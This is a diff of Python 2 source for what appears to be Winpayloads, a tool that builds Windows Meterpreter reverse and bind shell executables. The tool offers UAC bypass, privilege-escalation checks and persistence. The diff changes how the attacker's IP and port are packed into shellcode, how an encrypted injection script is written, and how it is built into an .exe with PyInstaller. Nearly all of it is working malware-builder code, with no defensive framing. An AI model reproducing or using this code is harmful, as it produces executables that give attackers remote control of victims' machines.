@@ -14,7 +14,7 @@ try:
 except:
     iperror = True
 
-payload, payloadchoice, payloaddir, ez2read_shellcode, nullbytecount, ez2read_shellcode2, want_UACBYPASS, want_ALLCHECKS, want_PERSISTENCE, payloadname = '', '', '/etc/winpayloads', '', 0, '', 'n', 'n', 'n' , ''
+payload, payloadchoice, payloaddir, ez2read_shellcode, nullbytecount, ez2read_shellcode2, want_UACBYPASS, want_ALLCHECKS, want_PERSISTENCE, payloadname, iphex = '', '', '/etc/winpayloads', '', 0, '', 'n', 'n', 'n' , '', ''
 
 try:
     os.mkdir(payloaddir)
@@ -40,7 +40,7 @@ try:
     print ('[3] Windows Bind Meterpreter' + t.bold_green + '(Staged)' + t.bold_red +
            ' [Shellter, UacBypass, Priv Esc Checks, Persistence]').center(t.width - 4) + t.normal
     print ('[4] Windows Reverse Meterpreter HTTPS' + t.bold_green + '(Staged)' +
-           t.bold_red + ' [not working]').center(t.width - 30) + t.normal
+           t.bold_red + ' []').center(t.width - 30) + t.normal
     print '=' * t.width
 
     while True:
@@ -69,6 +69,9 @@ try:
     if menuchoice == '1' or menuchoice == '2' or menuchoice == '4':
         portnum = raw_input(
             '\n[*] Press Enter For Default Port(4444)\n[*] Port> ')
+        if len(portnum) is 0:
+            portnum = 4444
+
         if iperror == False:
             ipaddr = raw_input(
                 '\n[*] Press Enter To Get Local Ip Automatically\n[*] IP> ')
@@ -79,25 +82,29 @@ try:
             ipaddr = raw_input(
                 '\n[*] Press Enter Your IP Manually(Automatic Disabled)\n[*] IP> ')
 
-        if len(portnum) is 0:
-            portnum = 4444
         print t.bold_green + '\n[*] IP SET AS %s\n[*] PORT SET AS %s\n' % (ipaddr, portnum) + t.normal
         try:
-            ip1, ip2, ip3, ip4 = ipaddr.split('.')
-            iphex = struct.pack('BBBB', int(ip1), int(ip2), int(ip3), int(ip4))
+            if menuchoice == '4':
+                iphex = ipaddr
+            else:
+                ip1, ip2, ip3, ip4 = ipaddr.split('.')
+                iphex = struct.pack('BBBB', int(ip1), int(ip2), int(ip3), int(ip4))
         except:
             print t.bold_red + '[*] Error in IP Syntax'
             sys.exit(1)
         try:
-            porthex = struct.pack('>h', int(portnum))
-            porthex2 = struct.pack('>h', int(portnum) + 1)
+            if menuchoice == '4':
+                porthex = struct.pack('<h', int(portnum))
+                porthex2 = struct.pack('<h', int(portnum) + 1)
+            else:
+                porthex = struct.pack('>h', int(portnum))
+                porthex2 = struct.pack('>h', int(portnum) + 1)
         except:
             print t.bold_red + '[*] Error in Port Syntax'
             sys.exit(1)
         if menuchoice == '4':
             shellcode = payloadchoice % (porthex, iphex)
             shellcode2 = payloadchoice % (porthex2, iphex)
-            print "using https"
         else:
             shellcode = payloadchoice % (iphex, porthex)
             shellcode2 = payloadchoice % (iphex, porthex2)
@@ -134,7 +141,7 @@ try:
             newpayloadlayout += char
             if count == 4:
                 newpayloadlayout += ','
-                count = 0
+                count = 0l
 
     if want_UACBYPASS.lower() == 'y':
         for byte in shellcode2:
@@ -191,7 +198,7 @@ try:
 
     if not want_to_payloadinexe == 'y':
         with open('%s/payload.py' % payloaddir, 'w+') as Filesave:
-            Filesave.write(FUNCTIONS().DoPyCipher(SHELLCODE.injectwindows % (ez2read_shellcode)))
+            Filesave.write(FUNCTIONS().DoPyCipher(SHELLCODE.injectwindows%(ez2read_shellcode)))
             Filesave.close()
 
         print '[*] Creating Payload using Pyinstaller...'
@@ -205,8 +212,6 @@ try:
                       (payloaddir, payloaddir, payloadname))
         elif menuchoice == '2':
             payloadname = 'ReverseWindowsMeterpreter.exe'
-            if re.search(payloadname,subprocess.check_output(['ls', '-la', '/etc/winpayloads'])):
-                payloadname = payloadname + "1"
             os.system('mv %s/dist/payload.exe %s/%s' %
                       (payloaddir, payloaddir, payloadname))
         elif menuchoice == '3':
